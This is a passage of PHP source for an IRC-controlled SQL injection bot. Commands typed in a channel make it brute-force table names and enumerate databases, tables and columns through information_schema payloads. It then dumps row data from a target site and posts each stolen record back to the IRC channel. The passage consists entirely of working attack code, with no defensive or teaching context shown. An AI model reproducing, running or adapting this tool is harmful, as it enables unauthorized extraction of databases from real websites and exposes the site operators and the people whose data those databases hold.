                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Type !saved to save your link first and then type !brute ...\r\n" );
                            break;
                        } else
                            if ( !file_exists($wordlists['mysql_tables']) )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Wordlist ".$wordlists['mysql_tables']." Not Found!\r\n" );
                                break;
                            }                        fwrite( $socket, "\nNOTICE $nick :" . chr(3) . "4$nick " . chr(3) . "12[+] Please Note That This Function Is Only Usefull for MySQL V4. There Is No Point Using It In MySQL V5!...\nPRIVMSG $channel :" .
                            chr(3) . "4$nick " . chr(3) . "12[+] Dictionary Attack Started...\r\n" );                        $Dictionary = file( $wordlists['mysql_tables'] );                        for ( $i = 0; $i < count($Dictionary); $i++ )
                        {
                            $Dictionary[$i] = str_replace( "\r\n", "", $Dictionary[$i] );
                            $website = prepare_dump( "/**/from/**/" . $Dictionary[$i], '0x7461626c655f6272757465' );
                            $source = page_get_content( $website );
                            if ( strstr($source, 's[[table_brute]]e') )
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Table" . chr(3) . "7 " . $Dictionary[$i] . " " . chr(3) . "12 Found! Site:" . chr(3) . "7 " . $website . "\r\n" );
                        }
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Attack Finished!\r\n" );
                    break;
                    case ":!get_dbs":
                        if ( !isset($sites[0]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Type !saved to save your link first and then type !get_dbs ... \r\n" );
                            break;
                        } else
                            if ( file_exists('./dbs_saved_site.txt') )
                            {                                $source = file_get_contents( './dbs_saved_site.txt' );
                                $databases = explode( ',', $source );
                                
                                fwrite_data_with_count( $databases, 'Databases', 20 );                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );
                                unset( $databases, $source );
                                break;
                            }
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Please Wait... This may take some seconds!\r\n" );                        $i = 0;
                        $fp = fopen( './dbs_saved_site.txt', 'w+' );
                        
                        if ( $fp )
                           if(!in_array('./dbs_saved_site.txt',$created_files))
                              array_push( $created_files, './dbs_saved_site.txt' );
                        else
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Could Not Create The File...\r\n" );                        while ( 1 )
                        {
                            $website = prepare_dump( "/**/from/**/information_schema.schemata/**/limit/**/" . $i . ",1", 'schema_name' );
                            $source = page_get_content( $website );
                            if ( preg_match('/s\[\[(.*?)\]\]e/', $source, $data) )
                                fwrite( $fp, $data[1] . ',' );
                            else
                                break;
                            $i++;
                        }
                        $source = file_get_contents( './dbs_saved_site.txt' );
                        
                        if ( empty($source) )
                        {
                            $no_dbs = "No Databases Found Or Access Is Denied";
                            fwrite( $fp, $no_dbs);
                            fclose( $fp );
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] ".$no_dbs."\r\n" );
                            break;
                        } else
                        {
                            $databases = substr( $source, 0, -1 );
                        }
                        fclose($fp);
                        $databases = explode( ',', $databases );
                        fwrite_data_with_count( $databases, 'Databases', 20 );                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );                        unset( $data, $databases, $website, $source );
                    break;
                    case ":!get_tables":
                        $db = $cmd[4]; //Unhexed
                        if ( $db != "database()" )
                            $hexed_db = "0x" . bin2hex( $db );
                        else
                            $hexed_db = $db;                        if ( !isset($sites[0]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Type !saved to save your link first and then type !get_tables database ... \r\n" );
                            break;
                        } else
                            if ( $db == null )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Database Missing!\r\n" );
                                break;
                            } else
                                if ( file_exists("./tables_saved_site" . $db . ".txt") )
                                {                                    $source = file_get_contents( "./tables_saved_site" . $db . ".txt" );
                                    $tables = explode( ',', $source );
                                    fwrite_data_with_count( $tables, 'Tables', 20 );                                    fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );
                                    unset( $tables, $source );
                                    break;
                                }
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Please Wait... This may take some seconds!\r\n" ); 
                        $i = 0;
                        $fp = fopen( "./tables_saved_site" . $db . ".txt", 'w+' );
                        
                        if ( $fp )
                            array_push( $created_files, "./tables_saved_site" . $db . ".txt" );
                        else
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Could Not Create The File...\r\n" );                        while ( 1 )
                        {
                            $website = prepare_dump( "/**/from/**/information_schema.tables/**/where/**/table_schema=" . $hexed_db . "/**/limit/**/" . $i . ",1", 'table_name' );
                            $source = page_get_content( $website );
                            if ( preg_match('/s\[\[(.*?)\]\]e/', $source, $data) )
                                fwrite( $fp, $data[1] . ',' );
                            else
                                break;
                            $i++;
                        }
                        $source = file_get_contents( "./tables_saved_site" . $db . ".txt" );
                        if ( empty($source) )
                        {
                            $no_tables = "No Tables Found Or Access Is Denied";
                            fwrite( $fp, $no_tables);
                            fclose( $fp );
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] ".$no_tables."\r\n" );
                            break;
                        } else
                        {
                            $tables = substr( $source, 0, -1 );
                        }
                        fclose( $fp );
                        $tables = explode( ',', $tables );
                        fwrite_data_with_count( $tables, 'Tables', 20 );                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );
                        unset( $data, $tables, $website, $source, $hexed_db, $db );
                    break;
                    case ":!get_cols":
                        $db = $cmd[4];
                        $table = $cmd[5];
                        if ( $db != "database()" )
                            $hexed_db = "0x" . bin2hex( $db );
                        else
                            $hexed_db = $db;                        if ( !isset($sites[0]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Type !saved to save your link first and then type !get_cols db table_name ...\r\n" );
                            break;
                        } else
                            if ( $table == null || $db == null )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Argument Missing.\r\n" );
                                break;
                            } else
                                if ( file_exists("./column_saved_site" . $db . $table . ".txt") )
                                {                                    $source = file_get_contents( "./column_saved_site" . $db . $table . ".txt" );
                                    $columns = explode( ',', $source );
                                    fwrite_data_with_count( $columns, "Columns($table)", 20 );
                                    fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );
                                    unset( $columns, $source );
                                    break;
                                }
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Please Wait... This may take some seconds!\r\n" );                        $hexed_table = "0x" . bin2hex( $table );                        $i = 0;
                        $fp = fopen( "./column_saved_site" . $db . $table . ".txt", 'w+' );
                        if ( $fp )
                            array_push( $created_files, "./column_saved_site" . $db . $table . ".txt" );
                        else
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Could Not Create The File...\r\n" );
                        while ( 1 )
                        {
                            $website = prepare_dump( "/**/from/**/information_schema.columns/**/where/**/table_name=" . $hexed_table . "/**/AND/**/table_schema=" . $hexed_db . "/**/limit/**/" . $i . ",1",
                                'column_name' );
                            $source = page_get_content( $website );
                            if ( preg_match('/s\[\[(.*?)\]\]e/', $source, $data) )
                                fwrite( $fp, $data[1] . ',' );
                            else
                                break;
                            $i++;
                        }                        $source = file_get_contents( "./column_saved_site" . $db . $table . ".txt" );
                        if ( empty($source) )
                        {
                            $no_cols = "No Columns Found Or Access Is Denied";
                            fwrite( $fp, $no_cols);
                            fclose( $fp );
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] ".$no_cols."\r\n" );
                            break;
                        } else
                        {
                            $columns = substr( $source, 0, -1 );
                        }
                        fclose( $fp );
                        $columns = explode( ',', $columns );
                        fwrite_data_with_count( $columns, "Columns($table)", 20 );                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );
                        unset( $db, $data, $columns, $source, $website, $hexed_table );
                    break;
                    case ":!dump":
                        $db = $cmd[4];
                        $table = $cmd[5];
                        $columns = $cmd[6];
                        if ( !isset($sites[0]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Type !saved to save your link first and then type !dump db table_name cols ...\r\n" );
                            break;
                        } else
                            if ( ($table == null) || ($db == null) || ($columns == null) )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Argument Missing.\r\n" );
                                break;
                            } else
                                if ( file_exists("./dump_saved_site" . $db . $table . $columns . ".txt") )
                                {                                    $source = file_get_contents( "./dump_saved_site" . $db . $table . $columns . ".txt" );
                                    $dump = explode( ',', $source );
                                    fwrite_data_with_count( $dump, "Dump($table)", 5 );
                                    fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );
                                    unset( $dump, $source );
                                    break;
                                }
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Please Wait... This may take some seconds!\r\n" );                        $explode = explode( ',', $columns );
                        $concat = '';
                        
                        for ( $i = 0; $i < count($explode); $i++ )
                            $concat .= $explode[$i] . ',char(58),';
                            
                        $concat = substr( $concat, 0, -10 );                        $i = 0;
                        $fp = fopen( "./dump_saved_site" . $db . $table . $columns . ".txt", 'w+' );
                        if ( $fp )
                            array_push( $created_files, "./dump_saved_site" . $db . $table . $columns . ".txt" );
                        else
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Could Not Create The File...\r\n" );
                        while ( 1 )
                        {
                            $website = prepare_dump( "/**/from/**/" . $db . "." . $table . "/**/limit/**/" . $i . ",1", $concat );
                            $source = page_get_content( $website );
                            if ( preg_match('/s\[\[(.*?)\]\]e/', $source, $data) )
                            {
                                fwrite( $fp, $data[1] . ',' );
                                $data = $data[1];
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] DUMP($table): " . chr(3) . "7 $data\r\n" );
                                sleep( 1 );
                            } else
                                break;
                            $i++;
                        }
                        $source = file_get_contents( "./dump_saved_site" . $db . $table . $columns . ".txt" );
                        if ( empty($source) )
                        {
                            $no_data = "No Data Found Or Access Is Denied";
                            fwrite( $fp, $no_data);
                            fclose( $fp );
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] ".$no_data."\r\n" );
                            break;
                        } else
                        {
                            $dump = substr( $source, 0, -1 );
                        }
                        fclose( $fp );
                        $dump = explode( ',', $dump );
                        fwrite_data_with_count( $dump, "Dump($table)", 1 );                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );                        unset( $db, $table, $columns, $data, $source, $website, $concat, $explode, $dump );
                    break;
                }
            }
            break;    }    if ( $cmd[0] == "PING" )
    {
        fwrite( $socket, "PONG " . $cmd[1] . "\n" );
    } 
}
fclose( $socket );?>